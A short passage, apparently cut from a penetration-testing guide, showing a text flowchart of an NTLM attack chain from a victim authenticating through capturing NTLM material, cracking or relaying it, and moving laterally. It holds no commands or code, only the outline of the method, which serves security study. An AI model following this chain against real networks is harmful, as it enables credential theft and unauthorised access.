      ↓
VICTIM AUTHENTICATES
      ↓
CAPTURE NTLM MATERIAL
      ↓
ENUMERATE USERS
      ↓
ASSESS / CRACK / RELAY
      ↓
RETEST CREDENTIALS
      ↓
LATERAL MOVEMENT / FURTHER ACCESS
```